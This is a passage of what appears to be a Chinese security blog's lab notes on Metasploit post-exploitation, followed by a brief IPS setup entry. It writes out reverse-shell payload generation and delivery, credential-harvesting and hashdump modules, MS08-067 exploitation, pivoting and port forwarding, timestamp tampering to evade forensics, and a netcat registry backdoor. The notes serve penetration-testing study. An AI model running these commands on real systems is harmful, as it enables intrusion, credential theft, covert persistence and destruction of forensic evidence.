<li>ssh登陆信息：<strong><code>🔺命令：run post/multi/gather/ssh_creds</code></strong> </li>
<li>检查目标机器程序是否恶意程序：<strong><code>🔺命令：run post/multi/gather/check_malware REMOTEFILE=c:\\a.exe</code></strong>（上传到各大查杀网站）</li>
</ul>
<h4 id="2-实验准备–POST模块"><a href="#2-实验准备–POST模块" class="headerlink" title="2. 实验准备–POST模块"></a>2. 实验准备–POST模块</h4><ul>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：msfvenom -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -a x86 --platform windows -b &#39;\x00&#39; -e x86/shikata_ga_nai -f exe -o a.exe</code></strong></li>
<li><strong><code>🔺命令：cp a.exe /var/www/html</code></strong></li>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/multi/handle</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP地址</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set exitonsession false</code></strong>（退出session继续监听）</li>
<li><strong><code>🔺命令：exploit -j -z</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：jobs</code></strong><ul>
<li>查看job是否一直有任务</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址，关闭防火墙</li>
<li>浏览器访问<a href="http://Kali的IP地址/a.exe，下载a.exe" target="_blank" rel="noopener">http://Kali的IP地址/a.exe，下载a.exe</a></li>
<li>执行a.exe</li>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：getuid</code></strong></li>
</ul>
</li>
</ul>
<h4 id="3-实验–POST模块"><a href="#3-实验–POST模块" class="headerlink" title="3. 实验–POST模块"></a>3. 实验–POST模块</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：session -i 1</code></strong><ul>
<li><strong><code>🔺命令：run post/windows/gather/arp_scanner RHOSTS=2.1.1.0/24</code></strong></li>
<li><strong><code>🔺命令：run post/windows/gather/checkvm</code></strong> </li>
<li><strong><code>🔺命令：run post/windows/gather/credentials/credential_collector</code></strong></li>
<li><strong><code>🔺命令：run post/windows/gather/enum_applications</code></strong></li>
<li><strong><code>🔺命令：run post/windows/gather/enum_logged_on_users</code></strong></li>
<li><strong><code>🔺命令：run post/windows/gather/enum_snmp</code></strong></li>
<li><strong><code>🔺命令：run post/multi/recon/local_exploit_suggester</code></strong></li>
<li><strong><code>🔺命令：run post/windows/manage/delete_user USERNAME=yuanfh</code></strong></li>
<li><strong><code>🔺命令：run post/multi/gather/env</code></strong> </li>
<li><strong><code>🔺命令：run post/multi/gather/firefox_creds</code></strong> </li>
<li><strong><code>🔺命令：run post/multi/gather/ssh_creds</code></strong> </li>
<li><strong><code>🔺命令：run post/multi/gather/check_malware REMOTEFILE=c:\\a.exe</code></strong><ul>
<li>▲ 2020.03.04 The requests resource is not among the finished,queued or pending scans，猜测上不了VT网站的原因</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-自动执行脚本"><a href="#4-自动执行脚本" class="headerlink" title="4. 自动执行脚本"></a>4. 自动执行脚本</h4><ul>
<li><strong><code>🔺命令：use exploit/multi/handle</code></strong></li>
<li>▲ AutoRunScript每次只允许指定一项</li>
<li>自动执行meterpreter脚本<ul>
<li><strong><code>🔺命令：show Advanced</code></strong>（高级选项）<ul>
<li>迁移到指定进程：<strong><code>🔺命令：set AutoRunScript migrate -n explorer.exe</code></strong></li>
<li>编辑目标机器的HOST文件：<strong><code>🔺命令：set AutoRunScript hostsedit -e 1.1.1.1,www.baidu.com</code></strong></li>
<li><strong><code>🔺命令：set InitialAutoRunScript checkvm</code></strong> </li>
</ul>
</li>
</ul>
</li>
<li>自动执行post模块<ul>
<li><strong><code>🔺命令：show Advanced</code></strong>（高级选项）<ul>
<li><strong><code>🔺命令：set InitialAutoRunScript migrate -n explorer.exe</code></strong> </li>
<li><strong><code>🔺命令：set AutoRunScript post/windows/gather/dumplinks</code></strong>（前提：需提前把自己<strong><code>🔺命令：migrate</code></strong>到目标用户上）</li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(一百一十)：MSF后渗透测试--Pivoting隧道</title>
    <url>/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Pivoting%E9%9A%A7%E9%81%93/</url>
    <content><![CDATA[<hr>
<h4 id="1-Pivoting跳板-枢纽-支点"><a href="#1-Pivoting跳板-枢纽-支点" class="headerlink" title="1. Pivoting跳板 / 枢纽 / 支点"></a>1. Pivoting跳板 / 枢纽 / 支点</h4><ul>
<li>利用已经控制的一台计算机作为入侵内网的跳板</li>
<li>在其他内网计算机看来访问全部来自于跳板机</li>
<li><strong><code>🔺命令：run autoroute -s 1.1.1.0/24</code></strong>  #不能访问外网的被攻击目标内网网段<ul>
<li>▲ 再深一层的内网，也可以使用，比如Window 7双网卡，第一块网卡接防火墙，第二块网卡接更深一层的私网，且不可路由</li>
</ul>
</li>
</ul>
<h4 id="2-实验–Pivoting自动路由"><a href="#2-实验–Pivoting自动路由" class="headerlink" title="2. 实验–Pivoting自动路由"></a>2. 实验–Pivoting自动路由</h4><ul>
<li>Mono 1<ul>
<li>网卡1模式为Host-only-2模式，检查网络</li>
<li>网卡2模式为Bridge模式，检查网络</li>
<li>LAN → 1.1.1.1 WAN → 192.168.0.110</li>
</ul>
</li>
<li>Mono 2<ul>
<li>网卡1模式为Host-only-3模式，检查网络</li>
<li>网卡2模式为Bridge模式，检查网络</li>
<li>2 set up A LAN Address<ul>
<li>2.1.1.1</li>
<li>24</li>
<li>dhcp</li>
<li>2.1.1.10</li>
<li>2.1.1.100</li>
</ul>
</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Host-only-2模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>浏览器访问mono 1<ul>
<li>Rules → WAN → LAN -&gt; Any</li>
<li>NAT → Inbound → <ul>
<li>External port range → from/to other4444</li>
<li>NAT IP → Kali的IP</li>
<li>Local port → other 4444</li>
<li>Auto-add a firewall rule to permit traffic through this NAT rule → Apply</li>
</ul>
</li>
<li>查看Rules → WAN是否添加规则正常</li>
<li>NAT → Inbound → <ul>
<li>External port range → from/to other80</li>
<li>NAT IP → Kali的IP</li>
<li>Local port → other 80</li>
<li>Auto-add a firewall rule to permit traffic through this NAT rule → Apply</li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li>物理主机访问mono 1的Brige模式的IP，是否能看到Kali开启的Web服务</li>
</ul>
</li>
<li>Window 7<ul>
<li>网卡模式为Host-only-3模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>浏览器访问mono 2<ul>
<li>Rules → LAN → LAN -&gt; ANY<ul>
<li>Action → Pass</li>
<li>Interface → LAN</li>
<li>Sourece → LAN subnet</li>
<li>save</li>
</ul>
</li>
</ul>
</li>
<li>浏览器访问百度尝试</li>
<li>关闭Window 7的UAC验证</li>
<li>重启电脑</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：msfvenom -p windows/meterpreter/reverse_tcp LHOST=mono 1的Brige模式下的IP地址 LPORT=4444 -a x86 --platform windows -b &#39;\x00\xff&#39; -e x86/shikata_ga -f exe a.exe</code></strong></li>
<li><strong><code>🔺命令：cp a.exe /var/www/html</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/multi/handle</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP地址</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问<a href="http://mono" target="_blank" rel="noopener">http://mono</a> 1的Brige模式下的IP地址/a.exe，下载a.exe</li>
<li>执行a.exe</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li>**`🔺命令：getuid</li>
<li><strong><code>🔺命令：run autoroute -s 2.1.1.0/24</code></strong></li>
<li><strong><code>🔺命令：run autoroute -p</code></strong> 查看路由表</li>
</ul>
</li>
</ul>
<h4 id="3-自动路由显示场景"><a href="#3-自动路由显示场景" class="headerlink" title="3. 自动路由显示场景"></a>3. 自动路由显示场景</h4><ul>
<li>利用win 7攻击内网XP（对比XP有无外网访问权的情况）</li>
<li>扫描内网：<strong><code>🔺命令：use auxiliary/scanner/portscan/tcp</code></strong></li>
<li>实验环境准备<ul>
<li>Window XP SP3 <ul>
<li>网卡模式为Host-only-3模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址，关闭防火墙</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-实验–攻击内网其他主机"><a href="#4-实验–攻击内网其他主机" class="headerlink" title="4. 实验–攻击内网其他主机"></a>4. 实验–攻击内网其他主机</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use auxiliary/scanner/portscan/tcp</code></strong><ul>
<li><strong><code>🔺命令：set RHOSTS 2.1.1.9-2.1.1.12</code></strong></li>
<li><strong><code>🔺命令：set PORTS 139,445</code></strong></li>
<li><strong><code>🔺命令：run</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：db_nmap -sV -p445 -A -Pn Window XP SP3的IP</code></strong></li>
<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
<li><strong><code>🔺命令：set RHOST Window XP SP3的IP</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Window 7的IP</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set target 34</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
<li>win 7若开启防火墙，可能要通过之前的shell来添加访问规则</li>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：getuid</code></strong></li>
<li><strong><code>🔺命令：background</code></strong></li>
<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
<li><strong><code>🔺命令：set RHOST Window XP SP3的IP</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST mono的IP</code></strong></li>
</ul>
</li>
<li><strong><code>🔺命令：set target 34</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
<li>查看是否拿到shell</li>
<li>删除路由</li>
<li><strong><code>🔺命令：session -i 1</code></strong><ul>
<li><strong><code>🔺命令：run autoroute -h</code></strong></li>
<li><strong><code>🔺命令：run autoroute -d -s 2.1.1.0/24</code></strong><ul>
<li>-s：增加路由记录</li>
<li>-d -s：删除路由记录</li>
</ul>
</li>
<li><strong><code>🔺命令：run autoroute -p</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<p><img src="/images/kali/kali-notepad/Pivoting%E8%87%AA%E5%8A%A8%E8%B7%AF%E7%94%B1.png" srcset="/img/loading.gif" alt="Pivoting自动路由"></p>
<h4 id="5-Pivoting端口转发–Portfwd"><a href="#5-Pivoting端口转发–Portfwd" class="headerlink" title="5.  Pivoting端口转发–Portfwd"></a>5.  Pivoting端口转发–Portfwd</h4><ul>
<li>利用已经被控计算机，在Kali与攻击目标之间实现端口转发</li>
<li><strong><code>🔺命令：portfwd add -L LIP -l LPORT -r RIP -p RPORT</code></strong></li>
<li><strong><code>🔺命令：portfwd add -L 1.1.1.10 -l 445 -r 2.1.1.11 -p 3389</code></strong> </li>
<li><strong><code>🔺命令：portfwd list  /  delete  /  flush</code></strong> </li>
</ul>
<h4 id="6-实验–Portfwd"><a href="#6-实验–Portfwd" class="headerlink" title="6. 实验–Portfwd"></a>6. 实验–Portfwd</h4><ul>
<li>Window XP SP3<ul>
<li>开启远程桌面</li>
</ul>
</li>
<li>Kali<ul>
<li>在上述实验Kali与Window 7建立的session的基础上</li>
<li><strong><code>🔺命令：session -i 1</code></strong><ul>
<li><strong><code>🔺命令：portfwd</code></strong></li>
<li><strong><code>🔺命令：portfwd add -L Kali的IP -l 3389 -r Window XP的IP -p 3389</code></strong></li>
<li><strong><code>🔺命令：portfwd list</code></strong>（Kali的IP）</li>
<li><strong><code>🔺命令：portfwd add -l 4489 -r Window XP的IP -p 3389</code></strong></li>
<li><strong><code>🔺命令：protfwd list</code></strong>（0.0.0.0）</li>
</ul>
</li>
<li>rdesktop Kali的IP的IP查看是否能开启远程桌面</li>
<li><strong><code>🔺命令：rdesktop 127.0.0.1:4489</code></strong>查看是否能开启远程桌面</li>
<li><strong><code>🔺命令：session -i 1</code></strong><ul>
<li>删除所有链接：<strong><code>🔺命令：portfwd flush</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>IPS笔记-2：IPS环境搭建</title>
    <url>/2020/03/03/IPS%E7%AC%94%E8%AE%B0-2%EF%BC%9AIPS%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    <content><![CDATA[<hr>
<h4 id="1-选择GNS"><a href="#1-选择GNS" class="headerlink" title="1. 选择GNS"></a>1. 选择GNS</h4><ul>
<li>GNS可以导入外部模块，但PT不行</li>
</ul>
<h4 id="2-初始化IPS"><a href="#2-初始化IPS" class="headerlink" title="2. 初始化IPS"></a>2. 初始化IPS</h4><ul>
<li>setup<ul>
<li>Enter host name:IPS</li>
<li>Enter IP Interface:设置VM8的IP地址以及网关</li>
<li>▲ 其他默认</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IPS-4240%E5%88%9D%E5%A7%8B%E5%8C%96%E9%85%8D%E7%BD%AE.png" srcset="/img/loading.gif" alt="IPS-4240初始化配置"></p>
<p><img src="/images/ips/ips-notepad/IPS-4240%E5%88%9D%E5%A7%8B%E5%8C%96%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" srcset="/img/loading.gif" alt="IPS-4240初始化配置成功"></p>
<h4 id="3-IME"><a href="#3-IME" class="headerlink" title="3. IME"></a>3. IME</h4><ul>
<li>安装IME对密码有要求，弱口令无法登陆</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME%E8%AE%BE%E7%BD%AE%E7%AE%80%E5%8D%95%E5%AF%86%E7%A0%81%E6%8A%A5%E9%94%99.png" srcset="/img/loading.gif" alt="IME设置简单密码报错"></p>
<ul>
<li>配置IME<ul>
<li>添加IPS的IP地址以及端口</li>
<li>添加IPS的账号密码</li>
<li>▲ 配置的时候，需要设置Configuration User和Event Subscription User</li>
</ul>
</li>
</ul>
<p><img src="/images/ips/ips-notepad/IME%E6%B7%BB%E5%8A%A0%E8%AE%BE%E5%A4%87.png" srcset="/img/loading.gif" alt="IME添加设备"></p>
<p><img src="/images/ips/ips-notepad/IME%E9%85%8D%E7%BD%AE%E6%88%90%E5%8A%9F.png" srcset="/img/loading.gif" alt="IME配置成功"></p>
<p>![IPS Configuration](/images/ips/ips-notepad/IPS Configuration.png)</p>
]]></content>
      <categories>
        <category>IPS</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>IPS</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(一百零九)：MSF后渗透测试--信息收集+后门</title>
    <url>/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E4%B9%9D)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86+%E5%90%8E%E9%97%A8/</url>
    <content><![CDATA[<hr>
<h4 id="1-实验环境"><a href="#1-实验环境" class="headerlink" title="1. 实验环境"></a>1. 实验环境</h4><ul>
<li>Window 7<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong> 查看IP地址</li>
<li>关闭防火墙，关闭UAC并重启</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong> 查看IP地址</li>
<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 7 -f exe -o 1.exe</code></strong> </li>
<li><strong><code>🔺命令：service apache2 start</code></strong> </li>
<li><strong><code>🔺命令：cp 1.exe /var/www/html</code></strong> </li>
<li><strong><code>🔺命令：msfconsole -q</code></strong> </li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong> <ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong> <ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong> </li>
<li><strong><code>🔺命令：exploit</code></strong> </li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问<a href="http://Kali的IP，下载保存1.exe" target="_blank" rel="noopener">http://Kali的IP，下载保存1.exe</a></li>
<li>双击打开1.exe</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
</ul>
</li>
</ul>
<h4 id="2-抓包（metrepreter）"><a href="#2-抓包（metrepreter）" class="headerlink" title="2. 抓包（metrepreter）"></a>2. 抓包（metrepreter）</h4><ul>
<li>在内存中缓存区块循环存储抓包（50000包），不写硬盘</li>
<li>智能过来meterpreter流量，传输全程使用SSL/TLS加密</li>
<li>Kali<ul>
<li><strong><code>🔺命令：load sniffer</code></strong> <ul>
<li><strong><code>🔺命令：sniffer_interfaces</code></strong>  </li>
<li><strong><code>🔺命令：sniffer_start 2</code></strong>  </li>
<li><strong><code>🔺命令：sniffer_dump 2 1.cap</code></strong>  </li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问路由器，输入密码</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：sniffer_dump 2 2.cap</code></strong> （含有密码信息）</li>
</ul>
</li>
</ul>
<h4 id="3-解码"><a href="#3-解码" class="headerlink" title="3. 解码"></a>3. 解码</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use auxiliary/sniffer/psnuffle</code></strong> </li>
<li><strong><code>🔺命令：set PCAPFILE /root/2.cap</code></strong> </li>
<li><strong><code>🔺命令：run</code></strong> </li>
</ul>
</li>
</ul>
<h4 id="4-搜索文件（meterpreter）"><a href="#4-搜索文件（meterpreter）" class="headerlink" title="4. 搜索文件（meterpreter）"></a>4. 搜索文件（meterpreter）</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：search -f *.ini</code></strong>  </li>
<li><strong><code>🔺命令：search -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f *.docx</code></strong> </li>
</ul>
</li>
</ul>
<h4 id="5-John-the-Ripper破解弱口令"><a href="#5-John-the-Ripper破解弱口令" class="headerlink" title="5. John the Ripper破解弱口令"></a>5. John the Ripper破解弱口令</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：use post/windows/gather/hashdump</code></strong>   #system权限的meterpreter<ul>
<li><strong><code>🔺命令：set session sessionID</code></strong> </li>
<li><strong><code>🔺命令：run</code></strong>   #结果保存在/tmp目录下</li>
</ul>
</li>
<li><strong><code>🔺命令：use auxiliary/analyze/jtr_crack_fast</code></strong> <ul>
<li><strong><code>🔺命令：run</code></strong> </li>
</ul>
</li>
<li>▲ 2020.03.03 暂无jtr_crack_fast此模块</li>
</ul>
</li>
</ul>
<h4 id="6-MAC时间"><a href="#6-MAC时间" class="headerlink" title="6. MAC时间"></a>6. MAC时间</h4><ul>
<li>文件系统访问会留下痕迹，电子取证重点关注</li>
<li>渗透测试和攻击者往往希望销毁文件系统访问痕迹</li>
<li>最好的避免被电子取证发现的方法：不要碰文件系统<ul>
<li>Meterpreter的先天优势所在（完全基于内存）</li>
</ul>
</li>
<li>MAC时间（Modified / Accessed / Created）<ul>
<li><strong><code>🔺命令：echo aaaa &gt; 1.txt</code></strong> </li>
<li><strong><code>🔺命令：ls -l --time=atime/ctime 1.txt</code></strong> （默认的时间为modified time）</li>
<li>列出文件的MAC时间：<strong><code>🔺命令：stat 1.txt</code></strong> </li>
<li>修改文件的MAC时间<ul>
<li><strong><code>🔺命令：touch -d &quot;2 days ago&quot; 1.txt</code></strong> （Created时间）</li>
<li><strong><code>🔺命令：touch -t 1501010101 1.txt</code></strong> （Modified和Accessed时间）</li>
</ul>
</li>
</ul>
</li>
<li>MACE：MFT entry<ul>
<li>MFT：NTFS文件系统的主文件分配表Master File Table</li>
<li>通常1024字节或2个硬盘扇区，其中存放多项entry信息</li>
<li>包含文件大量信息（大小、名称、目录位置、磁盘位置、创建时间）</li>
<li>更多信息可研究文件系统取证分析技术</li>
<li>▲ 可通过修改文件名称来查看E的变化</li>
</ul>
</li>
</ul>
<h4 id="7-Timestomp（meterpreter）"><a href="#7-Timestomp（meterpreter）" class="headerlink" title="7. Timestomp（meterpreter）"></a>7. Timestomp（meterpreter）</h4><ul>
<li>Kali<ul>
<li>timestomp参数<ul>
<li>-v：显示详细MAC时间</li>
<li>-f：指定模板文件时间作为复制</li>
<li>-b -r（递归擦除）：擦除MAC时间信息，目前此参数功能失效</li>
<li>-a/-c/-m/-e：修改MACE的A/C/M/E参数的时间</li>
<li>-z：修改MACE的所有参数的时间</li>
</ul>
</li>
<li>▲ EnCase工具在电子取证中很出名</li>
<li><strong><code>🔺命令：timestomp -v 1.txt</code></strong>  </li>
<li><strong><code>🔺命令：timestomp -f c:\\autoexec.bat 1.txt</code></strong> </li>
<li><strong><code>🔺命令：timestomp -z &quot;MM/DD/YYYY HH24:MI:SS&quot;  2.txt</code></strong> </li>
</ul>
</li>
</ul>
<h4 id="8-用注册表添加NC后门服务、打开防火墙端口（meterpreter）"><a href="#8-用注册表添加NC后门服务、打开防火墙端口（meterpreter）" class="headerlink" title="8. 用注册表添加NC后门服务、打开防火墙端口（meterpreter）"></a>8. 用注册表添加NC后门服务、打开防火墙端口（meterpreter）</h4><ul>
<li>注册表保存着windows几乎全部配置参数<ul>
<li>如果修改不当，可直接造成系统崩溃</li>
<li>修改前完整备份注册表</li>
<li>某些注册表的修改是不可逆的</li>
</ul>
</li>
<li>常见用途<ul>
<li>修改、增加启动项</li>
<li>窃取存储于注册表中的机密信息</li>
<li>绕过文件型病毒查杀</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32</code></strong> </li>
<li>查看Window 7系统启动程序：<strong><code>🔺命令：reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run</code></strong>  </li>
<li>在查看的主键在新建监制：<strong><code>🔺命令：reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#39;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&#39;</code></strong> </li>
<li><strong><code>🔺命令：reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc</code></strong> </li>
<li><strong><code>🔺命令：execute -f cmd -i -H</code></strong>  </li>
<li><strong><code>🔺命令：netsh firewall show opmode</code></strong>  </li>
<li><strong><code>🔺命令：netsh firewall add portopening TCP 4444 &quot;test&quot; ENABLE ALL</code></strong>  </li>
<li><strong><code>🔺命令：shutdown -r -t 0</code></strong>  </li>
</ul>
</li>
<li>Window 7<ul>
<li><strong><code>🔺命令：netstat -nao</code></strong> 查看是否开启了4444端口</li>
<li><strong><code>🔺命令：tasklist</code></strong> 查看进程的PID</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：nc Kali的IP 4444</code></strong> </li>
</ul>
</li>
<li>其他注册表项<ul>
<li><a href="https://support.accessdata.com/hc/en-us/articles/204448155-RegistryQuick-Find-Chart" target="_blank" rel="noopener">https://support.accessdata.com/hc/en-us/articles/204448155-RegistryQuick-Find-Chart</a></li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>Kali</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux笔记(一百零八)：MSF后渗透测试--Token提权</title>
    <url>/2020/03/03/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E9%9B%B6%E5%85%AB)%EF%BC%9AMSF%E5%90%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--Token%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<hr>
<h4 id="1-Msf后渗透测试阶段"><a href="#1-Msf后渗透测试阶段" class="headerlink" title="1. Msf后渗透测试阶段"></a>1. Msf后渗透测试阶段</h4><ul>
<li>已经获得目标系统控制权后扩大战果<ul>
<li>提权</li>
<li>信息收集</li>
<li>渗透内网</li>
<li>永久后门</li>
</ul>
</li>
<li>实验环境<ul>
<li>Window 7<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li>关闭防火墙</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="2-基于已有session扩大战果"><a href="#2-基于已有session扩大战果" class="headerlink" title="2. 基于已有session扩大战果"></a>2. 基于已有session扩大战果</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=Kali的IP LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -i 7 -f exe -o 1.exe</code></strong></li>
<li><strong><code>🔺命令：service apache2 start</code></strong></li>
<li><strong><code>🔺命令：cp 1.exe /var/www/html</code></strong></li>
<li><strong><code>🔺命令：msfconsole -q</code></strong></li>
<li><strong><code>🔺命令：use exploit/multi/handler</code></strong><ul>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong></li>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
<li>Window 7<ul>
<li>浏览器访问<a href="http://Kali的IP，下载保存1.exe" target="_blank" rel="noopener">http://Kali的IP，下载保存1.exe</a></li>
<li>双击打开1.exe</li>
</ul>
</li>
<li>Kali<ul>
<li>查看是否拿到shell</li>
<li><strong><code>🔺命令：session -l</code></strong></li>
</ul>
</li>
</ul>
<h4 id="3-获取system账号权限"><a href="#3-获取system账号权限" class="headerlink" title="3. 获取system账号权限"></a>3. 获取system账号权限</h4><ul>
<li>Kali<ul>
<li><strong><code>🔺命令：load priv</code></strong> </li>
<li><strong><code>🔺命令：getsystem</code></strong> <ul>
<li>priv_elevate_getsystem: Operation failed: Access is denied. </li>
<li>priv_elevate_getsystem: Operation failed: The enviroment is incorrect.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="4-Token提权"><a href="#4-Token提权" class="headerlink" title="4. Token提权"></a>4. Token提权</h4><ul>
<li>Tokens<ul>
<li>用户每次登陆，账号绑定临时的Token</li>
<li>访问资源时提价Token进行身份验证，类似于WEB Cookie</li>
<li>Delegate Token：交互登陆会话（windowd的登陆界面、远程桌面）</li>
<li>Impersonate Token：非交互登陆会话（SMB协议访问文件共享目录）</li>
<li>Delegate Token：账号注销后变为Impersonate Token，权限依然有效<ul>
<li>▲ 域管理员登陆注销后，依然依存这Token</li>
</ul>
</li>
</ul>
</li>
<li>Incognito<ul>
<li>独立功能的软件，被MSF集成在meterpreter中</li>
<li>无需密码破解或获取密码HASH，窃取Token将自己伪装成其他用户</li>
<li>尤其适用于域环境下提权渗透多操作系统</li>
</ul>
</li>
<li>搭建域环境<ul>
<li>▲ 2020.03.03 因搭建实验环境需要重启启动机器+硬盘空间所剩不足+XP和2003的有效期已经过了，故这次实验先暂且放一放</li>
<li>Window Server 2003<ul>
<li>配置静态IP地址，DNS服务器指向自己</li>
<li>运行域程序的安装：dcpromo（安装过程需要光盘）</li>
<li>DNS全名：lab.com</li>
<li>重新启动服务器</li>
<li>分配域账号（无本地用户） → dsa.msc → lab.com → Users → 右键 → 新建普通用户u1 → 设置账户密码（域的密码要复杂，需包含大写字母，小写字母，数字，特殊字符其中三种，且长度长于7个字符）</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>关闭防火墙 → 配置静态IP地址（DNS指向域控制器）</li>
<li>我的电脑 → 右键 → 属性 → 高级系统设置 → 计算机名 → 更改 → 指定域（lab.com）</li>
<li>重新启动机器</li>
<li>用域账号Administrator登陆，关闭防火墙</li>
<li>再用域账号u1登陆</li>
</ul>
</li>
<li>Window Server 2003<ul>
<li>Win+R → \Window XP SP3的IP\c$ → 进行操作</li>
</ul>
</li>
<li>Kali<ul>
<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
